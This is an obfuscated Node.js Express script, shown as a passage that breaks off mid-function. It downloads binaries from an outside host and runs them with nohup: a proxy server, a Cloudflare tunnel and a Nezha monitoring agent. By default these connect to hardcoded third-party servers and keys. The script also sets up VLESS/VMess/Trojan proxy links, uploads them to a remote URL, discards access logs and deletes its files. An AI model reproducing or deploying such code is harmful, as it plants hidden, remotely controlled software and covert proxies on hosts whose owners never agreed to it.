const _0x5bcb6e=_0x2b5a;(function(_0x3fd793,_0xd0da79){const _0xb2cfc7={_0x4b5c76:0x1df,_0x4a0b40:0x20b,_0x2930c6:0x1e9,_0x447e8f:0x175,_0x117574:0x1f2,_0x52d7ec:0x20c,_0xd04dbe:0x191},_0x2664a6=_0x2b5a,_0x540a8a=_0x3fd793();while(!![]){try{const _0x3a0260=-parseInt(_0x2664a6(0x16e))/0x1*(parseInt(_0x2664a6(_0xb2cfc7._0x4b5c76))/0x2)+-parseInt(_0x2664a6(_0xb2cfc7._0x4a0b40))/0x3+parseInt(_0x2664a6(_0xb2cfc7._0x2930c6))/0x4+parseInt(_0x2664a6(_0xb2cfc7._0x447e8f))/0x5*(parseInt(_0x2664a6(0x153))/0x6)+-parseInt(_0x2664a6(_0xb2cfc7._0x117574))/0x7*(parseInt(_0x2664a6(_0xb2cfc7._0x52d7ec))/0x8)+parseInt(_0x2664a6(_0xb2cfc7._0xd04dbe))/0x9*(parseInt(_0x2664a6(0x18e))/0xa)+parseInt(_0x2664a6(0x174))/0xb;if(_0x3a0260===_0xd0da79)break;else _0x540a8a['push'](_0x540a8a['shift']());}catch(_0x3ca0f5){_0x540a8a['push'](_0x540a8a['shift']());}}}(_0x3813,0xd838f));const express=require('express'),app=express(),axios=require(_0x5bcb6e(0x193)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5bcb6e(0x1a7)),exec=promisify(require(_0x5bcb6e(0x209))[_0x5bcb6e(0x212)]),{execSync}=require(_0x5bcb6e(0x209)),UPLOAD_URL=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x1a1)]||'',PROJECT_URL=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x1c0)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x5bcb6e(0x169)]['FILE_PATH']||_0x5bcb6e(0x17b),SUB_PATH=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x1c2)]||'sub',PORT=process[_0x5bcb6e(0x169)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process['env'][_0x5bcb6e(0x17f)]||_0x5bcb6e(0x18d),NEZHA_SERVER=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x210)]||_0x5bcb6e(0x15f),NEZHA_PORT=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x16f)]||'443',NEZHA_KEY=process['env'][_0x5bcb6e(0x1fb)]||_0x5bcb6e(0x1ac),ARGO_DOMAIN=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x19b)]||'claw.argox.x10.mx',ARGO_AUTH=process['env'][_0x5bcb6e(0x1b6)]||_0x5bcb6e(0x19e),ARGO_PORT=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x1cf)]||0x217b,CFIP=process['env'][_0x5bcb6e(0x1b0)]||_0x5bcb6e(0x1e6),CFPORT=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x1d0)]||0x1bb,NAME=process[_0x5bcb6e(0x169)][_0x5bcb6e(0x17c)]||_0x5bcb6e(0x178);!fs[_0x5bcb6e(0x195)](FILE_PATH)?(fs[_0x5bcb6e(0x14c)](FILE_PATH),console[_0x5bcb6e(0x207)](FILE_PATH+_0x5bcb6e(0x1fa))):console[_0x5bcb6e(0x207)](FILE_PATH+_0x5bcb6e(0x1ce));function generateRandomName(){const _0xc4bbfd={_0x4d107b:0x1a4,_0x5cb479:0x1e4},_0x41a972=_0x5bcb6e,_0x51215c=_0x41a972(0x17e);let _0x54ecbf='';for(let _0x2637f7=0x0;_0x2637f7<0x6;_0x2637f7++){_0x54ecbf+=_0x51215c[_0x41a972(_0xc4bbfd._0x4d107b)](Math['floor'](Math[_0x41a972(_0xc4bbfd._0x5cb479)]()*_0x51215c['length']));}return _0x54ecbf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5bcb6e(0x1dc)](FILE_PATH,phpName),webPath=path[_0x5bcb6e(0x1dc)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x5bcb6e(0x1dc)](FILE_PATH,_0x5bcb6e(0x1b1)),listPath=path['join'](FILE_PATH,_0x5bcb6e(0x19a)),bootLogPath=path[_0x5bcb6e(0x1dc)](FILE_PATH,_0x5bcb6e(0x150)),configPath=path[_0x5bcb6e(0x1dc)](FILE_PATH,_0x5bcb6e(0x16a));function deleteNodes(){const _0xd08e6f={_0x59782f:0x195,_0x59c406:0x19c,_0x1988ed:0x1eb,_0x1ef59:0x19c,_0xc14a24:0x1f4,_0xcb7c65:0x15a,_0x31d22a:0x14a},_0x5b6933=_0x5bcb6e;try{if(!UPLOAD_URL)return;if(!fs[_0x5b6933(_0xd08e6f._0x59782f)](subPath))return;let _0x4d3728;try{_0x4d3728=fs['readFileSync'](subPath,_0x5b6933(_0xd08e6f._0x59c406));}catch{return null;}const _0x1432d9=Buffer['from'](_0x4d3728,_0x5b6933(0x1a0))[_0x5b6933(_0xd08e6f._0x1988ed)](_0x5b6933(_0xd08e6f._0x1ef59)),_0x401f12=_0x1432d9['split']('\x0a')['filter'](_0x2672fb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5b6933(0x194)](_0x2672fb));if(_0x401f12[_0x5b6933(0x1d1)]===0x0)return;return axios[_0x5b6933(_0xd08e6f._0xc14a24)](UPLOAD_URL+_0x5b6933(_0xd08e6f._0xcb7c65),JSON['stringify']({'nodes':_0x401f12}),{'headers':{'Content-Type':_0x5b6933(0x199)}})[_0x5b6933(_0xd08e6f._0x31d22a)](_0x2c5819=>{return null;}),null;}catch(_0x5ca361){return null;}}function cleanupOldFiles(){const _0x9bcef={_0xdbecde:0x14b},_0x131cb6=_0x5bcb6e;try{const _0x554282=fs[_0x131cb6(0x171)](FILE_PATH);_0x554282[_0x131cb6(0x1a5)](_0x1097f7=>{const _0x3d9d24=_0x131cb6,_0x1d0359=path['join'](FILE_PATH,_0x1097f7);try{const _0x1f0902=fs['statSync'](_0x1d0359);_0x1f0902[_0x3d9d24(_0x9bcef._0xdbecde)]()&&fs[_0x3d9d24(0x1d6)](_0x1d0359);}catch(_0x15f5a0){}});}catch(_0x1dc1df){}}app[_0x5bcb6e(0x1ec)]('/',function(_0x27edef,_0x4964fa){const _0xb03422={_0x3ae4d8:0x19d},_0xbf3f5d=_0x5bcb6e;_0x4964fa[_0xbf3f5d(_0xb03422._0x3ae4d8)](_0xbf3f5d(0x1cb));});async function generateConfig(){const _0x1aa640={_0x1a3661:0x20d,_0x129ccc:0x16c,_0x448ffe:0x163,_0x4485ce:0x18a,_0x1046aa:0x1ee,_0x3835be:0x160,_0x10e78b:0x1b4,_0x67086d:0x15e,_0x1a649b:0x167,_0xe9b114:0x16a},_0x107e13=_0x5bcb6e,_0x7850e4={'log':{'access':'/dev/null','error':_0x107e13(_0x1aa640._0x1a3661),'loglevel':_0x107e13(_0x1aa640._0x129ccc)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x107e13(0x160),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x107e13(_0x1aa640._0x129ccc),'fallbacks':[{'dest':0xbb9},{'path':_0x107e13(_0x1aa640._0x448ffe),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x107e13(_0x1aa640._0x4485ce),'dest':0xbbc}]},'streamSettings':{'network':_0x107e13(_0x1aa640._0x1046aa)}},{'port':0xbb9,'listen':_0x107e13(0x1b4),'protocol':_0x107e13(_0x1aa640._0x3835be),'settings':{'clients':[{'id':UUID}],'decryption':_0x107e13(0x16c)},'streamSettings':{'network':_0x107e13(0x1ee),'security':_0x107e13(0x16c)}},{'port':0xbba,'listen':_0x107e13(_0x1aa640._0x10e78b),'protocol':_0x107e13(0x160),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x107e13(0x16c)},'streamSettings':{'network':'ws','security':_0x107e13(_0x1aa640._0x129ccc),'wsSettings':{'path':_0x107e13(0x163)}},'sniffing':{'enabled':!![],'destOverride':[_0x107e13(0x1c5),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x107e13(0x1b4),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x107e13(0x162)}},'sniffing':{'enabled':!![],'destOverride':[_0x107e13(0x1c5),_0x107e13(_0x1aa640._0x67086d),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x107e13(_0x1aa640._0x10e78b),'protocol':_0x107e13(0x17a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x107e13(0x16c),'wsSettings':{'path':_0x107e13(_0x1aa640._0x4485ce)}},'sniffing':{'enabled':!![],'destOverride':[_0x107e13(0x1c5),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x107e13(0x1e0),'tag':_0x107e13(_0x1aa640._0x1a649b)},{'protocol':'blackhole','tag':_0x107e13(0x1f6)}]};fs[_0x107e13(0x1a2)](path['join'](FILE_PATH,_0x107e13(_0x1aa640._0xe9b114)),JSON['stringify'](_0x7850e4,null,0x2));}function getSystemArchitecture(){const _0x2e1233={_0x31cb6d:0x1d4},_0x499baf=_0x5bcb6e,_0x25f191=os[_0x499baf(0x157)]();return _0x25f191===_0x499baf(0x1ca)||_0x25f191===_0x499baf(_0x2e1233._0x31cb6d)||_0x25f191===_0x499baf(0x1e7)?_0x499baf(0x1ca):'amd';}function downloadFile(_0x40ab54,_0x531f6f,_0x3dc58f){const _0x2efef5={_0x4343a5:0x195,_0x2aea0c:0x1ec,_0x516693:0x189,_0x1e6d67:0x14a},_0x27ba54={_0x42f0d8:0x14d},_0x43fce3={_0xbbdcf7:0x196,_0x4f92d6:0x1b8},_0x126b45=_0x5bcb6e,_0x5e6a68=_0x40ab54;!fs[_0x126b45(_0x2efef5._0x4343a5)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x35714e=fs[_0x126b45(0x1cd)](_0x5e6a68);axios({'method':_0x126b45(_0x2efef5._0x2aea0c),'url':_0x531f6f,'responseType':_0x126b45(0x1af)})[_0x126b45(_0x2efef5._0x516693)](_0x10b1be=>{const _0x12e7f0={_0x90116a:0x14d},_0xb4666f=_0x126b45;_0x10b1be[_0xb4666f(_0x43fce3._0xbbdcf7)][_0xb4666f(0x1f5)](_0x35714e),_0x35714e['on']('finish',()=>{const _0x253bac=_0xb4666f;_0x35714e['close'](),console['log'](_0x253bac(0x1bf)+path[_0x253bac(0x14d)](_0x5e6a68)+_0x253bac(0x1e5)),_0x3dc58f(null,_0x5e6a68);}),_0x35714e['on'](_0xb4666f(_0x43fce3._0x4f92d6),_0x57d573=>{const _0x138039=_0xb4666f;fs['unlink'](_0x5e6a68,()=>{});const _0x4f0579=_0x138039(0x1bf)+path[_0x138039(_0x12e7f0._0x90116a)](_0x5e6a68)+_0x138039(0x1b7)+_0x57d573['message'];console[_0x138039(0x1b8)](_0x4f0579),_0x3dc58f(_0x4f0579);});})[_0x126b45(_0x2efef5._0x1e6d67)](_0x3ce04f=>{const _0x26be51=_0x126b45,_0x4915ae='Download\x20'+path[_0x26be51(_0x27ba54._0x42f0d8)](_0x5e6a68)+_0x26be51(0x1b7)+_0x3ce04f[_0x26be51(0x1c1)];console['error'](_0x4915ae),_0x3dc58f(_0x4915ae);});}async function downloadFilesAndRun(){const _0x29c981={_0x49ee78:0x1a3,_0x2ab193:0x1b8,_0x3273f9:0x204,_0xd17ab4:0x1c6,_0x2441f8:0x16d,_0x32b3dc:0x159,_0xac14db:0x1a8,_0x2b1dec:0x205,_0x3acf0f:0x1e2,_0x41d813:0x173,_0x21b775:0x1b8,_0x31db11:0x213,_0x119ae6:0x20a,_0x2cbd7b:0x1e8,_0xe5cc6e:0x1da,_0x5d2f74:0x161,_0x3181c9:0x1c7,_0x3b4ae9:0x1b8,_0x4b7867:0x207,_0x28c3b4:0x207,_0x384ad7:0x195,_0x24a4f6:0x192,_0x16cf65:0x192,_0x3f250c:0x1b2,_0x285e85:0x151,_0x2926b8:0x1b8},_0x3b2c26={_0xd5321e:0x1a5},_0x351c30={_0x382039:0x195,_0x1ae1bd:0x1d7},_0x4afb1c=_0x5bcb6e,_0x4a04ce=getSystemArchitecture(),_0x46a5cc=getFilesForArchitecture(_0x4a04ce);if(_0x46a5cc[_0x4afb1c(0x1d1)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x280f6b=_0x46a5cc[_0x4afb1c(_0x29c981._0x49ee78)](_0x34c524=>{const _0x4df407={_0xd74556:0x15c};return new Promise((_0xa80be2,_0x4e08a1)=>{const _0x24b1d0=_0x2b5a;downloadFile(_0x34c524['fileName'],_0x34c524[_0x24b1d0(_0x4df407._0xd74556)],(_0x56c70f,_0x224df4)=>{_0x56c70f?_0x4e08a1(_0x56c70f):_0xa80be2(_0x224df4);});});});try{await Promise[_0x4afb1c(0x1e3)](_0x280f6b);}catch(_0x4c7e8c){console[_0x4afb1c(_0x29c981._0x2ab193)](_0x4afb1c(_0x29c981._0x3273f9),_0x4c7e8c);return;}function _0x554df7(_0x2d01b6){const _0x57e773={_0x567cb6:0x1aa},_0x142ec9=_0x4afb1c,_0x495cba=0x1fd;_0x2d01b6[_0x142ec9(_0x3b2c26._0xd5321e)](_0x4efc84=>{const _0x15ef7c=_0x142ec9;fs[_0x15ef7c(_0x351c30._0x382039)](_0x4efc84)&&fs[_0x15ef7c(_0x351c30._0x1ae1bd)](_0x4efc84,_0x495cba,_0x1cc553=>{const _0x2f9902=_0x15ef7c;_0x1cc553?console[_0x2f9902(0x1b8)](_0x2f9902(_0x57e773._0x567cb6)+_0x4efc84+':\x20'+_0x1cc553):console['log'](_0x2f9902(0x1b9)+_0x4efc84+':\x20'+_0x495cba[_0x2f9902(0x1eb)](0x8));});});}const _0xd89929=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x554df7(_0xd89929);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2449be=NEZHA_SERVER[_0x4afb1c(0x20a)](':')?NEZHA_SERVER[_0x4afb1c(0x1ba)](':')['pop']():'',_0x19ce14=new Set([_0x4afb1c(0x1d5),'8443',_0x4afb1c(0x213),_0x4afb1c(_0x29c981._0xd17ab4),'2083',_0x4afb1c(0x20e)]),_0x124ca6=_0x19ce14[_0x4afb1c(0x1bd)](_0x2449be)?_0x4afb1c(_0x29c981._0x2441f8):_0x4afb1c(_0x29c981._0x32b3dc),_0x4ca76e=_0x4afb1c(0x1de)+NEZHA_KEY+_0x4afb1c(_0x29c981._0xac14db)+NEZHA_SERVER+_0x4afb1c(_0x29c981._0x2b1dec)+_0x124ca6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4afb1c(0x1a2)](path[_0x4afb1c(0x1dc)](FILE_PATH,_0x4afb1c(_0x29c981._0x3acf0f)),_0x4ca76e);const _0x6610fd='nohup\x20'+phpPath+_0x4afb1c(0x152)+FILE_PATH+_0x4afb1c(_0x29c981._0x41d813);try{await exec(_0x6610fd),console[_0x4afb1c(0x207)](phpName+_0x4afb1c(0x1c7)),await new Promise(_0x29d0e0=>setTimeout(_0x29d0e0,0x3e8));}catch(_0x3d01c1){console[_0x4afb1c(_0x29c981._0x21b775)](_0x4afb1c(0x211)+_0x3d01c1);}}else{let _0x573ec6='';const _0x48e010=[_0x4afb1c(0x1d5),_0x4afb1c(0x185),_0x4afb1c(_0x29c981._0x31db11),_0x4afb1c(0x1c6),'2083','2053'];_0x48e010[_0x4afb1c(_0x29c981._0x119ae6)](NEZHA_PORT)&&(_0x573ec6='--tls');const _0x1fe5b9=_0x4afb1c(_0x29c981._0x2cbd7b)+npmPath+_0x4afb1c(0x1cc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4afb1c(_0x29c981._0xe5cc6e)+NEZHA_KEY+'\x20'+_0x573ec6+_0x4afb1c(_0x29c981._0x5d2f74);try{await exec(_0x1fe5b9),console['log'](npmName+_0x4afb1c(_0x29c981._0x3181c9)),await new Promise(_0x199257=>setTimeout(_0x199257,0x3e8));}catch(_0x41e372){console[_0x4afb1c(_0x29c981._0x3b4ae9)](_0x4afb1c(0x1dd)+_0x41e372);}}}else console[_0x4afb1c(_0x29c981._0x4b7867)](_0x4afb1c(0x18c));const _0xe4a9fe=_0x4afb1c(0x1e8)+webPath+'\x20-c\x20'+FILE_PATH+_0x4afb1c(0x1ed);try{await exec(_0xe4a9fe),console[_0x4afb1c(_0x29c981._0x28c3b4)](webName+_0x4afb1c(_0x29c981._0x3181c9)),await new Promise(_0xdaf48d=>setTimeout(_0xdaf48d,0x3e8));}catch(_0x3149f0){console[_0x4afb1c(0x1b8)](_0x4afb1c(0x18b)+_0x3149f0);}if(fs[_0x4afb1c(_0x29c981._0x384ad7)](botPath)){let _0x2bffef;if(ARGO_AUTH[_0x4afb1c(_0x29c981._0x24a4f6)](/^[A-Z0-9a-z=]{120,250}$/))_0x2bffef=_0x4afb1c(0x1bb)+ARGO_AUTH;else ARGO_AUTH[_0x4afb1c(_0x29c981._0x16cf65)](/TunnelSecret/)?_0x2bffef=_0x4afb1c(_0x29c981._0x3f250c)+FILE_PATH+_0x4afb1c(0x1f7):_0x2bffef=_0x4afb1c(0x184)+FILE_PATH+_0x4afb1c(_0x29c981._0x285e85)+ARGO_PORT;try{await exec(_0x4afb1c(0x1e8)+botPath+'\x20'+_0x2bffef+_0x4afb1c(0x15b)),console[_0x4afb1c(0x207)](botName+'\x20is\x20running'),await new Promise(_0x502bd4=>setTimeout(_0x502bd4,0x7d0));}catch(_0x1afcba){console[_0x4afb1c(_0x29c981._0x2926b8)](_0x4afb1c(0x170)+_0x1afcba);}}await new Promise(_0xce58f0=>setTimeout(_0xce58f0,0x1388));}function getFilesForArchitecture(_0x1723e2){const _0x4cd16e={_0x297200:0x1f9,_0x2f8f56:0x154,_0x8d34d6:0x1e1},_0x43b81d=_0x5bcb6e;let _0x4c4cf3;_0x1723e2===_0x43b81d(0x1ca)?_0x4c4cf3=[{'fileName':webPath,'fileUrl':_0x43b81d(_0x4cd16e._0x297200)},{'fileName':botPath,'fileUrl':_0x43b81d(0x158)}]:_0x4c4cf3=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x45e823=_0x1723e2==='arm'?_0x43b81d(_0x4cd16e._0x2f8f56):_0x43b81d(0x1f3);_0x4c4cf3[_0x43b81d(_0x4cd16e._0x8d34d6)]({'fileName':npmPath,'fileUrl':_0x45e823});}else{const _0x15b0ea=_0x1723e2==='arm'?_0x43b81d(0x1be):_0x43b81d(0x164);_0x4c4cf3[_0x43b81d(0x1e1)]({'fileName':phpPath,'fileUrl':_0x15b0ea});}}return _0x4c4cf3;}function argoType(){const _0x358300={_0x391fd6:0x207,_0xc688f7:0x1ad,_0x466c53:0x1a2,_0x27f3c1:0x188,_0x53d97e:0x1dc,_0x2046e4:0x172,_0x568b92:0x176,_0x4f8f03:0x1d8},_0x447471=_0x5bcb6e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x447471(_0x358300._0x391fd6)](_0x447471(_0x358300._0xc688f7));return;}if(ARGO_AUTH[_0x447471(0x20a)](_0x447471(0x14f))){fs[_0x447471(_0x358300._0x466c53)](path[_0x447471(0x1dc)](FILE_PATH,_0x447471(_0x358300._0x27f3c1)),ARGO_AUTH);const _0x2f6d15=_0x447471(0x1ea)+ARGO_AUTH[_0x447471(0x1ba)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x447471(_0x358300._0x53d97e)](FILE_PATH,_0x447471(0x188))+_0x447471(0x1d2)+ARGO_DOMAIN+_0x447471(0x16b)+ARGO_PORT+_0x447471(_0x358300._0x2046e4);fs[_0x447471(0x1a2)](path[_0x447471(0x1dc)](FILE_PATH,_0x447471(_0x358300._0x568b92)),_0x2f6d15);}else console[_0x447471(0x207)](_0x447471(_0x358300._0x4f8f03));}function _0x2b5a(_0x16adff,_0x412291){const _0x38137e=_0x3813();return _0x2b5a=function(_0x2b5aa9,_0x316b7d){_0x2b5aa9=_0x2b5aa9-0x14a;let _0x5bbd83=_0x38137e[_0x2b5aa9];return _0x5bbd83;},_0x2b5a(_0x16adff,_0x412291);}async function extractDomains(){const _0x56f244={_0x38f5d6:0x1b5,_0x3c04ff:0x1d1,_0x174e8f:0x1d9,_0x2c9b3a:0x207,_0x54867b:0x1d6,_0x76999:0x150,_0x5cb892:0x184,_0x5098bb:0x151,_0x4fc45c:0x1e8,_0x29a6d5:0x15b,_0x1fd73b:0x1b8},_0xa24c53={_0x357374:0x179,_0x24aba6:0x196,_0x111581:0x196,_0x5748b4:0x190,_0x718271:0x196,_0x19ccbe:0x196,_0x1f0a0c:0x190},_0x421eca={_0x452517:0x1ff,_0xbaa1fc:0x200,_0x252884:0x17d,_0x374ad6:0x1c4},_0x5588da=_0x5bcb6e;let _0xa16232;if(ARGO_AUTH&&ARGO_DOMAIN)_0xa16232=ARGO_DOMAIN,console[_0x5588da(0x207)](_0x5588da(_0x56f244._0x38f5d6),_0xa16232),await _0x2d87a0(_0xa16232);else try{const _0x1255a2=fs[_0x5588da(0x198)](path['join'](FILE_PATH,_0x5588da(0x150)),_0x5588da(0x19c)),_0x1904aa=_0x1255a2['split']('\x0a'),_0x4b6441=[];_0x1904aa['forEach'](_0x2b1317=>{const _0x4fcf65=_0x2b1317['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4fcf65){const _0x7dae40=_0x4fcf65[0x1];_0x4b6441['push'](_0x7dae40);}});if(_0x4b6441[_0x5588da(_0x56f244._0x3c04ff)]>0x0)_0xa16232=_0x4b6441[0x0],console['log'](_0x5588da(_0x56f244._0x174e8f),_0xa16232),await _0x2d87a0(_0xa16232);else{console[_0x5588da(_0x56f244._0x2c9b3a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5588da(_0x56f244._0x54867b)](path[_0x5588da(0x1dc)](FILE_PATH,_0x5588da(_0x56f244._0x76999)));async function _0x177ffa(){const _0x41e642=_0x5588da;try{process[_0x41e642(_0x421eca._0x452517)]==='win32'?await exec(_0x41e642(0x1c8)+botName+_0x41e642(0x1ae)):await exec(_0x41e642(_0x421eca._0xbaa1fc)+botName[_0x41e642(0x1a4)](0x0)+']'+botName[_0x41e642(_0x421eca._0x252884)](0x1)+_0x41e642(_0x421eca._0x374ad6));}catch(_0x443f34){}}_0x177ffa(),await new Promise(_0xbc7878=>setTimeout(_0xbc7878,0xbb8));const _0x44c46b=_0x5588da(_0x56f244._0x5cb892)+FILE_PATH+_0x5588da(_0x56f244._0x5098bb)+ARGO_PORT;try{await exec(_0x5588da(_0x56f244._0x4fc45c)+botPath+'\x20'+_0x44c46b+_0x5588da(_0x56f244._0x29a6d5)),console[_0x5588da(0x207)](botName+_0x5588da(0x1c7)),await new Promise(_0x597f9a=>setTimeout(_0x597f9a,0xbb8)),await extractDomains();}catch(_0x3f1cb1){console[_0x5588da(0x1b8)](_0x5588da(0x170)+_0x3f1cb1);}}}catch(_0x19ca5b){console[_0x5588da(_0x56f244._0x1fd73b)]('Error\x20reading\x20boot.log:',_0x19ca5b);}async function _0x551847(){const _0x408034=_0x5588da;try{const _0x27c994=await axios[_0x408034(0x1ec)](_0x408034(_0xa24c53._0x357374),{'timeout':0xbb8});if(_0x27c994[_0x408034(_0xa24c53._0x24aba6)]&&_0x27c994[_0x408034(0x196)][_0x408034(0x202)]&&_0x27c994[_0x408034(0x196)][_0x408034(0x190)])return _0x27c994['data']['country_code']+'_'+_0x27c994[_0x408034(_0xa24c53._0x111581)][_0x408034(_0xa24c53._0x5748b4)];}catch(_0x1ca872){try{const _0x427033=await axios['get'](_0x408034(0x1bc),{'timeout':0xbb8});if(_0x427033['data']&&_0x427033['data'][_0x408034(0x1f0)]===_0x408034(0x187)&&_0x427033[_0x408034(0x196)]['countryCode']&&_0x427033[_0x408034(_0xa24c53._0x718271)][_0x408034(_0xa24c53._0x5748b4)])return _0x427033[_0x408034(_0xa24c53._0x19ccbe)][_0x408034(0x201)]+'_'+_0x427033[_0x408034(0x196)][_0x408034(_0xa24c53._0x1f0a0c)];}catch(_0x2fd1c8){}}return'Unknown';}async function _0x2d87a0(_0x3e7080){const _0x5df9c7=await _0x551847(),_0x7a80de=NAME?NAME+'-'+_0x5df9c7:_0x5df9c7;return new Promise(_0x1385c7=>{const _0x527774={_0x5c553d:0x208,_0x3945e3:0x15e,_0x2c281b:0x20f,_0x30861f:0x1f8,_0x1eb7c6:0x1eb,_0xd1ba6b:0x182,_0x506441:0x181,_0x5a3c9e:0x207,_0x1526be:0x1eb,_0x2b8c88:0x1fe,_0x13c2d1:0x207};setTimeout(()=>{const _0x465ef2={_0x909356:0x1a0,_0x4f1ff6:0x1c9,_0xf7a485:0x1fd},_0x2b79bf=_0x2b5a,_0x31227b={'v':'2','ps':''+_0x7a80de,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x3e7080,'path':_0x2b79bf(_0x527774._0x5c553d),'tls':_0x2b79bf(_0x527774._0x3945e3),'sni':_0x3e7080,'alpn':'','fp':_0x2b79bf(_0x527774._0x2c281b)},_0xb58b73=_0x2b79bf(0x14e)+UUID+'@'+CFIP+':'+CFPORT+_0x2b79bf(0x1fc)+_0x3e7080+'&fp=firefox&type=ws&host='+_0x3e7080+_0x2b79bf(0x180)+_0x7a80de+_0x2b79bf(_0x527774._0x30861f)+Buffer[_0x2b79bf(0x1fe)](JSON[_0x2b79bf(0x1c3)](_0x31227b))[_0x2b79bf(_0x527774._0x1eb7c6)](_0x2b79bf(0x1a0))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x2b79bf(_0x527774._0xd1ba6b)+_0x3e7080+_0x2b79bf(0x206)+_0x3e7080+_0x2b79bf(_0x527774._0x506441)+_0x7a80de+_0x2b79bf(0x186);console[_0x2b79bf(_0x527774._0x5a3c9e)](Buffer[_0x2b79bf(0x1fe)](_0xb58b73)[_0x2b79bf(_0x527774._0x1526be)]('base64')),fs[_0x2b79bf(0x1a2)](subPath,Buffer[_0x2b79bf(_0x527774._0x2b8c88)](_0xb58b73)['toString'](_0x2b79bf(0x1a0))),console[_0x2b79bf(_0x527774._0x13c2d1)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x2b79bf(0x1ec)]('/'+SUB_PATH,(_0x4057aa,_0x3aba71)=>{const _0x30f6de=_0x2b79bf,_0x576b4b=Buffer[_0x30f6de(0x1fe)](_0xb58b73)[_0x30f6de(0x1eb)](_0x30f6de(_0x465ef2._0x909356));_0x3aba71[_0x30f6de(_0x465ef2._0x4f1ff6)](_0x30f6de(_0x465ef2._0xf7a485),_0x30f6de(0x1ab)),_0x3aba71['send'](_0x576b4b);}),_0x1385c7(_0xb58b73);},0x7d0);});}}async function uploadNodes(){const _0x98e5af={_0x289943:0x1f4,_0x2c32f7:0x1f0,_0x570f55:0x198,_0x4807a3:0x1ba,_0xec296c:0x166,_0x4e19fa:0x168,_0x5907e8:0x207},_0x19dbd7=_0x5bcb6e;if(UPLOAD_URL&&PROJECT_URL){const _0x3150a5=PROJECT_URL+'/'+SUB_PATH,_0x4589ec={'subscription':[_0x3150a5]};try{const _0x4fe13a=await axios[_0x19dbd7(_0x98e5af._0x289943)](UPLOAD_URL+'/api/add-subscriptions',_0x4589ec,{'headers':{'Content-Type':_0x19dbd7(0x199)}});return _0x4fe13a&&_0x4fe13a[_0x19dbd7(0x1f0)]===0xc8?(console[_0x19dbd7(0x207)](_0x19dbd7(0x183)),_0x4fe13a):null;}catch(_0x58fbf3){if(_0x58fbf3[_0x19dbd7(0x197)]){if(_0x58fbf3[_0x19dbd7(0x197)][_0x19dbd7(_0x98e5af._0x2c32f7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4dbdc9=fs[_0x19dbd7(_0x98e5af._0x570f55)](listPath,_0x19dbd7(0x19c)),_0x1b1664=_0x4dbdc9[_0x19dbd7(_0x98e5af._0x4807a3)]('\x0a')[_0x19dbd7(_0x98e5af._0xec296c)](_0x2b79d2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2b79d2));if(_0x1b1664['length']===0x0)return;const _0x422121=JSON['stringify']({'nodes':_0x1b1664});try{const _0x153a61=await axios[_0x19dbd7(0x1f4)](UPLOAD_URL+_0x19dbd7(_0x98e5af._0x4e19fa),_0x422121,{'headers':{'Content-Type':_0x19dbd7(0x199)}});return _0x153a61&&_0x153a61[_0x19dbd7(_0x98e5af._0x2c32f7)]===0xc8?(console[_0x19dbd7(_0x98e5af._0x5907e8)](_0x19dbd7(0x155)),_0x153a61):null;}catch(_0x9aa02c){return null;}}else return;}}function cleanFiles(){const _0x3551db={_0x5128ea:0x1ef,_0x4ea62a:0x177,_0x3af4b8:0x1db,_0x3d65cb:0x1d3},_0x12cabb={_0x4378ee:0x203,_0x3d9e5c:0x18f};setTimeout(()=>{const _0x210426=_0x2b5a,_0x488eab=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x488eab[_0x210426(_0x3551db._0x5128ea)](npmPath);else 